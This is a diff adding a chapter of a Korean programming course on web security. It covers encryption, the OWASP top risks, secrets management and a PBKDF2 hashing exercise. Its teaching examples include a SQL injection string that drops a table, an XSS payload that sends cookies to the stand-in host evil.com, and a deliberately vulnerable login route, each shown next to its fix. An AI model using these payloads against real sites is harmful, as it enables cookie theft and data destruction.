+<h3>암호화 (Encryption)</h3>
+
+<div style="overflow-x:auto">
+<table>
+<caption>암호화 유형과 사용 시점</caption>
+<thead><tr><th>유형</th><th>키</th><th>속도</th><th>사용 사례</th></tr></thead>
+<tbody>
+<tr><td><strong>대칭 암호화</strong> (AES)</td><td>공유 키 하나</td><td>빠름</td><td>저장 데이터, VPN</td></tr>
+<tr><td><strong>비대칭 암호화</strong> (RSA)</td><td>공개키 + 개인키 쌍</td><td>느림</td><td>TLS 핸드셰이크, 서명</td></tr>
+<tr><td><strong>해싱</strong> (SHA-256)</td><td>키 없음 (단방향)</td><td>빠름</td><td>비밀번호, 데이터 무결성</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">주의: 해싱은 암호화가 아닙니다</div>
+<p>암호화는 역방향이 가능합니다 — 올바른 키로 복호화할 수 있습니다. 해싱은 단방향입니다 — 원본을 <strong>복구할 수 없습니다</strong>. 비밀번호는 해시하십시오(검증만 필요). 신용카드 번호 같은 민감한 데이터는 암호화하십시오(나중에 <em>실제로</em> 읽어야 함).</p>
+</div>
+
+<h3>OWASP 주요 취약점</h3>
+
+<p>OWASP(Open Web Application Security Project)는 가장 중요한 웹 보안 위험 목록을 관리합니다. 반드시 이해해야 할 상위 다섯 가지입니다.</p>
+
+<h4>1. SQL 인젝션 (SQL Injection)</h4>
+
+<p>공격자가 입력 필드에 악의적인 SQL을 삽입합니다. 문자열 연결로 SQL을 구성하면 공격자가 전체 데이터베이스를 읽거나, 수정하거나, 삭제할 수 있습니다.</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: string concatenation
+username = "admin'; DROP TABLE users; --"
+query = f"SELECT * FROM users WHERE username = '{username}'"
+# Becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
+# Your entire users table is deleted!
+
+# SAFE: parameterised query
+cursor.execute(
+    "SELECT * FROM users WHERE username = ?",
+    (username,)
+)
+# The ? placeholder treats input as DATA, not SQL code</code></pre>
+
+<h4>2. 인증 취약점 (Broken Authentication)</h4>
+
+<p>약한 비밀번호, 속도 제한 없음, 만료되지 않는 토큰, 안전하지 않은 비밀번호 재설정 흐름. 해결: 강력한 비밀번호 적용, MFA(다중 인증) 사용, 토큰 만료, 로그인 시도 속도 제한.</p>
+
+<h4>3. 교차 사이트 스크립팅 (Cross-Site Scripting, XSS)</h4>
+
+<p>공격자가 다른 사용자가 보는 페이지에 JavaScript를 삽입합니다. 스크립트는 피해자의 브라우저에서 실행되어 쿠키나 세션 토큰을 훔칩니다.</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: user input directly in HTML
+task_title = '&lt;script&gt;document.location="https://evil.com/?c="+document.cookie&lt;/script&gt;'
+html = f"&lt;h1&gt;{task_title}&lt;/h1&gt;"
+# The script executes in every viewer's browser!
+
+# SAFE: output encoding (escape HTML characters)
+from markupsafe import escape
+html = f"&lt;h1&gt;{escape(task_title)}&lt;/h1&gt;"
+# Renders as visible text, not executable code</code></pre>
+
+<h4>4. 서버 측 요청 위조 (Server-Side Request Forgery, SSRF)</h4>
+
+<p>공격자가 서버를 속여 내부 서비스에 요청을 보내게 합니다. 앱이 사용자가 제공한 URL을 가져오는 경우, 공격자가 <code>http://localhost:5432</code>를 입력하여 내부 네트워크를 탐색할 수 있습니다. 해결: URL을 검증하고 허용 목록(allowlist)을 사용하며, 내부 IP 범위를 차단하십시오.</p>
+
+<h4>5. 보안 설정 오류 (Security Misconfiguration)</h4>
+
+<p>기본 비밀번호가 변경되지 않았거나, 프로덕션에서 디버그 모드가 활성화되어 있거나, 사용자에게 상세한 스택 트레이스가 노출되거나, 불필요한 서비스가 열려 있는 경우입니다. 해결: 기본값을 강화하고, 설정을 감사하며, 디버그 정보를 절대 노출하지 마십시오.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>OWASP Top 10 취약점 6~10위와 빠른 수정 방법</caption>
+<thead><tr><th>#</th><th>취약점</th><th>빠른 수정</th></tr></thead>
+<tbody>
+<tr><td>6</td><td>취약하고 오래된 컴포넌트</td><td>정기적으로 의존성 감사 (<code>pip audit</code>)</td></tr>
+<tr><td>7</td><td>식별 및 인증 실패</td><td>MFA, 속도 제한, 안전한 세션</td></tr>
+<tr><td>8</td><td>소프트웨어 및 데이터 무결성 실패</td><td>다운로드 검증, 서명된 패키지 사용</td></tr>
+<tr><td>9</td><td>보안 로깅 및 모니터링 실패</td><td>인증 이벤트 로깅, 이상 징후 알림</td></tr>
+<tr><td>10</td><td>안전하지 않은 설계</td><td>배포 후가 아닌 설계 중 위협 모델링</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>안전한 코딩 관행</h3>
+
+<ul>
+<li><strong>입력 유효성 검사(Input validation):</strong> 서버에서 모든 입력을 검증합니다. 클라이언트 측 검증은 UX이고, 서버 측은 보안입니다. 클라이언트를 절대 신뢰하지 마십시오.</li>
+<li><strong>매개변수화된 쿼리(Parameterised queries):</strong> 항상 사용합니다. 예외 없이. 사용자 입력이 있는 모든 SQL 쿼리는 플레이스홀더를 사용해야 합니다.</li>
+<li><strong>출력 인코딩(Output encoding):</strong> XSS를 방지하기 위해 HTML에서 렌더링하기 전에 모든 사용자 생성 콘텐츠를 인코딩합니다.</li>
+<li><strong>의존성 감사(Dependency auditing):</strong> 정기적으로 의존성의 취약점을 스캔합니다. <code>pip audit</code> 또는 GitHub Dependabot을 사용합니다.</li>
+</ul>
+
+<h3>시크릿 관리 (Secrets Management)</h3>
+
+<p><strong>버전 관리에 자격 증명을 커밋하지 마십시오.</strong> 한 번도, 일시적으로도. Git 히스토리는 영구적입니다 — 삭제 후에도 시크릿은 히스토리에 남아 있습니다.</p>
+
+<pre style="overflow-x:auto"><code># BAD: hardcoded secret
+API_KEY = "sk-live-abc123def456"
+
+# GOOD: environment variable
+import os
+API_KEY = os.environ.get("API_KEY")
+if not API_KEY:
+    raise RuntimeError("API_KEY not set")
+
+# BETTER: .env file (not committed) with python-dotenv
+# .env file (in .gitignore):
+# API_KEY=sk-live-abc123def456
+
+from dotenv import load_dotenv
+load_dotenv()
+API_KEY = os.environ["API_KEY"]</code></pre>
+
+<p>프로덕션에서는 전용 시크릿 저장소를 사용하십시오: AWS Secrets Manager, HashiCorp Vault, 또는 플랫폼의 내장 시크릿 관리.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge에 인증을 추가하십시오: PBKDF2로 비밀번호 해싱 구현, JWT 토큰을 반환하는 로그인/등록 엔드포인트 생성, 보호된 라우트에서 토큰을 확인하는 데코레이터 추가, 최소 "admin"과 "viewer" 역할의 RBAC 구현. 그런 다음 모든 SQL 쿼리를 감사하여 문자열 연결을 매개변수화된 쿼리로 교체하십시오.</p>
+</div>
+
+<div class="pq">"보안은 제품이 아닌 프로세스다." &mdash; Bruce Schneier</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; 취약점 찾기</div>
+<p>이 코드에서 모든 보안 문제를 식별하십시오:</p>
+<pre style="overflow-x:auto"><code>@app.route("/login", methods=["POST"])
+def login():
+    username = request.form["username"]
+    password = request.form["password"]
+    user = db.execute(
+        f"SELECT * FROM users WHERE username = '{username}'"
+    ).fetchone()
+    if user and user["password"] == password:
+        session["user"] = username
+        return "Login successful"
+    return "Invalid credentials"</code></pre>
+<p>문제점: (1) f-string을 통한 SQL 인젝션, (2) 평문 비밀번호 비교, (3) 속도 제한 없음, (4) CSRF 보호 없음. 각각을 어떻게 수정하겠습니까?</p>
+</div>
+
+<!-- Ch33 Quiz -->
+<div class="quiz" data-ch="33" data-ex="sql-injection">
+  <h4>핵심 개념 확인</h4>
+  <p>다음 중 SQL 인젝션 취약점은 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = ?", (task_id,))</code></button>
+    <button class="quiz-option" data-correct="true"><code>cursor.execute(f"SELECT * FROM tasks WHERE id = {task_id}")</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = :id", {"id": task_id})</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = %s", (task_id,))</code></button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch33 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="33" data-ex="password-hashing">
+  <div class="exercise-header">
+    <h4>연습: 비밀번호 해싱</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt"><code>hashlib</code>를 사용하여 비밀번호 해싱을 구현하십시오. SHA-256과 100,000번 반복을 사용하는 PBKDF2로 <code>hash_password(password, salt)</code>를 완성하십시오. 그런 다음 비밀번호가 일치할 때만 True를 반환하는 <code>verify_password(password, salt, expected_hash)</code>를 완성하십시오. 다른 솔트가 다른 해시를 생성함을 시연하십시오.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import hashlib
+
+def hash_password(password, salt):
+    """Hash a password with the given salt using PBKDF2-SHA256.
+    Args:
+        password: str - the plaintext password
+        salt: bytes - the salt value
+    Returns:
+        bytes - the derived key (hash)
+    """
+    # TODO: use hashlib.pbkdf2_hmac with 'sha256', 100000 iterations
+    pass
+
+def verify_password(password, salt, expected_hash):
+    """Return True if password matches the expected hash."""
+    # TODO: hash the password and compare
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test basic hashing
+salt1 = b"salt_value_one__"
+hash1 = hash_password("my_password", salt1)
+assert hash1 is not None, "hash_password returned None"
+assert isinstance(hash1, bytes), "hash_password should return bytes"
+assert len(hash1) == 32, f"SHA-256 produces 32 bytes, got {len(hash1)}"
+
+# Test consistency
+hash1_again = hash_password("my_password", salt1)
+assert hash1 == hash1_again, "Same password+salt must produce same hash"
+
+# Test different salts produce different hashes
+salt2 = b"different_salt!!"
+hash2 = hash_password("my_password", salt2)
+assert hash1 != hash2, "Different salts must produce different hashes"
+
+# Test different passwords produce different hashes
+hash3 = hash_password("other_password", salt1)
+assert hash1 != hash3, "Different passwords must produce different hashes"
+
+# Test verify_password
+assert verify_password("my_password", salt1, hash1) == True, "Correct password should verify"
+assert verify_password("wrong_password", salt1, hash1) == False, "Wrong password should fail"
+assert verify_password("my_password", salt2, hash1) == False, "Wrong salt should fail"
+
+print("All password hashing tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">실행</button>
+    <button class="ex-check">확인</button>
+    <button class="ex-hint" data-level="0">힌트</button>
+    <button class="ex-reset">초기화</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint"><code>hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)</code>를 사용하여 해시를 만드십시오.</p>
+    <p class="hint">verify_password는 주어진 비밀번호와 솔트로 hash_password를 호출한 다음 결과를 expected_hash와 비교하십시오. 일치하면 True를 반환합니다.</p>
+    <p class="hint">비밀번호 문자열을 bytes로 인코딩하는 것을 기억하십시오: <code>password.encode('utf-8')</code>. 솔트는 이미 bytes입니다.</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== Phase 7 Gate ===== -->
+<section id="gate7">
+<h2><span class="ch-label">페이즈 7 게이트</span> 체크포인트 &amp; TaskForge 엔지니어링</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">핵심 개념</div>
+<p>페이즈 8로 넘어가기 전에 아래 항목을 모두 시연할 수 있어야 합니다. 선택 사항이 아닙니다 &mdash; 건너뛰면 페이즈 8에서 전제하는 역량에 공백이 생깁니다.</p>
+</div>
+
+<div style="overflow-x:auto">
+<table>
+<caption>페이즈 7 게이트: 필수 역량과 시연 방법</caption>
+<thead><tr><th>역량</th><th>시연 방법</th></tr></thead>
+<tbody>
+<tr><td>SOLID 원칙 적용</td><td>SRP를 위반하는 클래스를 집중된 컴포넌트로 리팩터링</td></tr>
+<tr><td>전략 패턴 사용</td><td>비즈니스 로직 변경 없이 TaskForge 스토리지 백엔드 교체</td></tr>
+<tr><td>복잡한 SQL 작성</td><td>JOIN, 윈도우 함수, CTE를 사용하여 올바른 결과 도출</td></tr>
+<tr><td>쿼리 최적화</td><td>EXPLAIN 출력 해석, 인덱스 추가, N+1 쿼리 수정</td></tr>
+<tr><td>트랜잭션 처리</td><td>실패 시 롤백 시연; 격리 수준 설명</td></tr>
+<tr><td>네트워킹 설명</td><td>HTTP 요청을 DNS, TCP, TLS, 애플리케이션 레이어를 통해 추적</td></tr>
+<tr><td>동시성 모델 선택</td><td>워크로드에 맞는 스레딩, async, 멀티프로세싱 매칭</td></tr>
+<tr><td>인증 구현</td><td>비밀번호 해싱, 자격 증명 검증, 토큰 발급</td></tr>
+<tr><td>OWASP 상위 5개 방지</td><td>코드에서 SQL 인젝션, XSS, 인증 취약점 식별 및 수정</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>산출물: TaskForge 엔지니어링 업그레이드</h3>
+
+<p>이 페이즈에서 배운 기술을 TaskForge에 집중적으로 적용하십시오.</p>
+
+<ol>
+<li><strong>디자인 패턴:</strong> TaskForge를 전략 패턴으로 리팩터링하여 스토리지 백엔드를 교체 가능하게 만드십시오(최소 두 가지: SQLite와 테스트용 인메모리). 의존성 주입을 적용하여 TaskManager가 생성자를 통해 백엔드를 받도록 하십시오.</li>
+<li><strong>데이터베이스 최적화:</strong> TaskForge 데이터베이스에 인덱스를 추가하십시오. 가장 자주 사용하는 쿼리 세 개에 EXPLAIN을 실행하여 인덱스 사용 여부를 확인하십시오. API 라우트에서 N+1 쿼리를 수정하십시오.</li>
+<li><strong>인증 &amp; 보안:</strong> PBKDF2 또는 bcrypt로 비밀번호 해싱을 추가하십시오. 로그인/등록 엔드포인트를 만드십시오. 보호된 모든 라우트에 토큰 기반 인증을 추가하십시오. 최소 &ldquo;admin&rdquo;과 &ldquo;viewer&rdquo; 역할의 RBAC를 구현하십시오. 모든 SQL 쿼리에서 매개변수화된 구문을 사용하는지 감사하십시오.</li>
+<li><strong>트랜잭션:</strong> &ldquo;프로젝트 간 태스크 이동&rdquo;과 같은 다단계 작업을 트랜잭션으로 감싸고, 실패 시 적절히 롤백되도록 하십시오.</li>
+</ol>
+
+<div role="note" class="callout warn">
+<div class="callout-title">주의</div>
+<p>전략 패턴을 설명하고 기본 버전을 구현할 수 없거나, JOIN 쿼리를 작성하거나 SQL 인젝션 취약점을 식별할 수 없다면 &mdash; 해당 장을 다시 학습하십시오. 이것들은 이후 모든 내용의 기초가 되는 역량입니다.</p>
+</div>
+
+<h3>이제 할 수 있는 것</h3>
+
+<ul>
+<li>검증된 디자인 패턴을 사용하여 확장 가능한 시스템을 구성할 수 있습니다</li>
+<li>복잡하고 효율적인 SQL 쿼리를 작성하고, 그 성능의 이유를 이해합니다</li>
+<li>트랜잭션으로 데이터 무결성을 보호하고 적절한 격리 수준을 선택합니다</li>
+<li>DNS에서 HTTP 응답까지 인터넷의 작동 방식을 설명할 수 있습니다</li>
+<li>모든 워크로드에 적합한 동시성 모델을 선택하고 흔한 버그를 피합니다</li>
+<li>가장 흔한 공격 벡터에 대응하는 안전한 애플리케이션을 구축합니다</li>
+</ul>
+
+<div role="note" class="callout info">
+<div class="callout-title">참고</div>
+<p>이제 안전하고 잘 구조화된 데이터베이스 기반 애플리케이션을 구축할 수 있습니다. 페이즈 8에서는 더 넓은 시야로 바라봅니다: 수백만 사용자를 처리하는 시스템은 어떻게 설계합니까? 분산 시스템은 어떻게 일관성을 유지합니까? 성능을 어떻게 측정하고 개선합니까? 여기서 배운 엔지니어링 기술이 시스템 규모에서 사고하는 토대가 됩니다.</p>
+</div>
+
+</section>
+
+<nav class="phase-nav">
+  <a href="phase-6.html" class="phase-nav-link prev"><span class="phase-nav-label">이전 페이즈</span>&larr; 페이즈 6: 알고리즘(Algorithm)</a>
+  <a href="phase-8.html" class="phase-nav-link next"><span class="phase-nav-label">다음 페이즈</span>페이즈 8: 시스템과 확장 &rarr;</a>
+</nav>
+
+</div>
+</div>
+
+<footer>
+<p>제로 투 히어로: 프로그래밍에서 멀티 에이전트 Claude Code까지 &middot; 2026년 3월</p>
+</footer>
+
+<script src="../js/progress.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.36.5/src-min-noconflict/ace.js"></script>
+<script src="../js/theme.js"></script>
+<script src="../js/sidebar.js"></script>
+<script src="../js/shared.js"></script>
+<script src="../js/ace-init.js"></script>
+<script src="../js/pyodide-runner.js"></script>
+<script src="../js/quiz.js"></script>
+<script src="../js/exercise-runner.js"></script>
+</body>
+</html>
